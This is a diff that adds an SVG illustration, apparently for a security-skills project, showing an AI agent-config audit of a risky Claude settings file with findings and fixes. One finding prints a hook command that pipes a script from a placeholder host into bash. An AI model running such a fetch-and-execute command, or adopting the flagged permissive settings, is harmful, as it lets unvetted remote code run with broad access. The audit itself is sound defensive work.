@@ -1,0 +1,28 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="960" height="454" viewBox="0 0 960 454" role="img" aria-label="Example: Claude audits a risky settings.json with Claude Security Skills">
+<rect width="960" height="454" rx="14" fill="#0b1220"/>
+<path d="M14 0H946a14 14 0 0 1 14 14V40H0V14A14 14 0 0 1 14 0z" fill="#111a2e"/>
+<circle cx="26" cy="20" r="6" fill="#f87171"/><circle cx="46" cy="20" r="6" fill="#fbbf24"/><circle cx="66" cy="20" r="6" fill="#4ade80"/>
+<text x="480" y="25" text-anchor="middle" font-family="ui-sans-serif,system-ui,-apple-system,Segoe UI,sans-serif" font-size="13" fill="#64748b">claude code + claude-security-skills</text>
+<g font-family="ui-monospace,SFMono-Regular,Menlo,Consolas,monospace" font-size="15">
+<text x="28" y="72" fill="#7dd3fc" font-weight="700">&gt; is my .claude/settings.json safe?</text>
+<text x="28" y="97" fill="#64748b">Claude picks ai-agent-security and runs agent_config_audit.py</text>
+<text x="28" y="147" fill="#f1f5f9" font-weight="700">Agent config audit: 2 file(s), 18 finding(s)</text>
+<rect x="28" y="181" width="106" height="22" rx="5" fill="#f87171" fill-opacity="0.16"/>
+<text x="81" y="197" text-anchor="middle" fill="#f87171" font-weight="700" font-size="13">CRITICAL</text>
+<text x="150" y="197" fill="#e2e8f0">AGT-001  defaultMode is bypassPermissions</text>
+<text x="150" y="222" fill="#64748b">at .claude/settings.json:3</text>
+<text x="150" y="247" fill="#86efac">fix: use "default" or "acceptEdits", allow specific commands</text>
+<rect x="28" y="256" width="106" height="22" rx="5" fill="#f87171" fill-opacity="0.16"/>
+<text x="81" y="272" text-anchor="middle" fill="#f87171" font-weight="700" font-size="13">CRITICAL</text>
+<text x="150" y="272" fill="#e2e8f0">AGT-002  All shell commands allowed: Bash(*)</text>
+<text x="150" y="297" fill="#86efac">fix: allow only what you need, e.g. "Bash(npm run test:*)"</text>
+<rect x="28" y="306" width="106" height="22" rx="5" fill="#fb923c" fill-opacity="0.16"/>
+<text x="81" y="322" text-anchor="middle" fill="#fb923c" font-weight="700" font-size="13">HIGH</text>
+<text x="150" y="322" fill="#e2e8f0">AGT-030  Secret inline in settings env: ANTHROPIC_API_KEY</text>
+<text x="150" y="347" fill="#64748b">value sk-a... is stored in plain text (masked in output)</text>
+<rect x="28" y="356" width="106" height="22" rx="5" fill="#fb923c" fill-opacity="0.16"/>
+<text x="81" y="372" text-anchor="middle" fill="#fb923c" font-weight="700" font-size="13">HIGH</text>
+<text x="150" y="372" fill="#e2e8f0">AGT-020  PostToolUse hook downloads a script and runs it</text>
+<text x="150" y="397" fill="#64748b">curl -s https://hooks.example.test/fmt.sh | bash</text>
+<text x="150" y="422" fill="#64748b">... and 14 more, each with a fix</text>
+</g></svg>
